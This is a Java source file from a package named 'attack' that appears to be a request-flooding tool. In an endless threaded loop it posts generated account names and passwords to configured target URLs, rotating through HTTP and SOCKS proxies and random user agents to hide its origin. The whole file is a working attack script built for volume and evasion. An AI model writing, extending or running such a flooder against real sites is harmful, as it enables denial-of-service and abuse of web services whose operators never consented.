package attack;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.util.Random;

public class main implements Runnable {
    private static String[] proxyhttp;
    private static String[] proxysocks;
    private static boolean proxyhttpswich = false;
    private static boolean proxysocksswich = false;
    private static Random random = new Random();

    {// 初始化
        if (manage.file.proxyswitch) {
            proxyhttp = proxy.readhttp(manage.file.proxyfile);
            if (proxyhttp != null) {
                proxyhttpswich = true;
            }
            proxysocks = proxy.readsocks(manage.file.proxyfile);
            if (proxysocks != null) {
                proxysocksswich = true;
            }
        }
    }

    public void run() {
        // proxy
        String proxytype = "";
        String proxyurl = "";
        String[] proxyiurl = { "", "" };
        String proxyhost = "";
        int proxyport = 0;
        if (manage.file.proxyswitch) {
            if (proxyhttpswich && proxysocksswich) {
                if (random.nextBoolean()) {
                    proxytype = "http";
                    proxyurl = proxyhttp[random.nextInt(proxyhttp.length)];
                } else {
                    proxytype = "socks";
                    proxyurl = proxysocks[random.nextInt(proxysocks.length)];
                }
            } else if (proxyhttpswich && !proxysocksswich) {
                proxytype = "http";
                proxyurl = proxyhttp[random.nextInt(proxyhttp.length)];
            } else if (!proxyhttpswich && proxysocksswich) {
                proxytype = "socks";
                proxyurl = proxysocks[random.nextInt(proxysocks.length)];
            }
            proxyiurl = proxy.iurl(proxyurl);
            proxyhost = proxyiurl[0];
            proxyport = Integer.valueOf(proxyiurl[1]);
        }
        while (manage.storage.start) {
            // System.out.println(Thread.currentThread().getName());
            // url
            String url;
            if (manage.file.urls.length - 1 == 0) {
                url = manage.file.urls[0];
            } else
                url = manage.file.urls[random.nextInt(manage.file.urls.length - 1)].toString();
            // name
            String rn;
            Long brn = (long) (Math.random() * (99999999999l - 10000000)) + 1000000;
            switch (random.nextInt(2) + 1) {
                case 1:
                    int length = random.nextInt(99999999 - 10000000) + 10000000;
                    rn = manage.storage.bfnum[random.nextInt(manage.storage.bfnum.length)].toString() + length;
                    break;
                case 2:
                    rn = brn.toString() + "@qq.com";
                    break;
                case 3:
                default:
                    rn = brn.toString();
                    break;
            }
            // rp
            String pass = password.get();
            // 输出
            if (manage.file.genoutput) {
                System.out.println(rn + " " + pass);
            }
            go(rn, pass, url, proxytype, proxyhost, proxyport);
        }
    }

    private static void go(String name, String pass, String surl, String proxytype, String proxyurl, int proxyport) {
        HttpURLConnection httpURLConnection = null;
        try {
            URL url = new URL(surl);
            if (proxytype == "" && proxyurl == "") {
                httpURLConnection = (HttpURLConnection) url.openConnection();
            } else {
                if (proxytype == "http") {
                    Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyurl, proxyport));
                    httpURLConnection = (HttpURLConnection) url.openConnection(proxy);
                } else if (proxytype == "socks") {
                    Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(proxyurl, proxyport));
                    httpURLConnection = (HttpURLConnection) url.openConnection(proxy);
                }
            }
            httpURLConnection.setRequestMethod("POST");
            // 超时时间
            httpURLConnection.setConnectTimeout(3000);
            // 设置是否输出
            httpURLConnection.setDoOutput(true);
            // 设置是否读入
            httpURLConnection.setDoInput(true);
            // 设置是否使用缓存
            httpURLConnection.setUseCaches(false);
            // 设置此 HttpURLConnection 实例是否应该自动执行 HTTP 重定向
            httpURLConnection.setInstanceFollowRedirects(false);
            // 设置请求头
            httpURLConnection.setRequestProperty("Content-Length", "40");
            httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            httpURLConnection.setRequestProperty("User-Agent",
                    manage.storage.useragent[random.nextInt(manage.storage.useragent.length - 1)]);
            // 连接
            httpURLConnection.connect();
            // 写入参数到请求中
            String param = manage.file.param.replace("$[account]", name);
            param = param.replace("$[password]", pass);
            OutputStream out = httpURLConnection.getOutputStream();
            out.write(param.getBytes());
            out.flush();
            out.close();
        } catch (IOException e) {
            System.out.println(surl + " 转发出错，错误信息：" + e.getLocalizedMessage() + ";" + e.getClass());
        } finally {
            if (null != httpURLConnection) {
                try {
                    httpURLConnection.disconnect();
                } catch (Exception e) {
                    System.out.println(surl + " httpURLConnection 流关闭异常：" + e.getLocalizedMessage());
                }
            }
        }
    }
}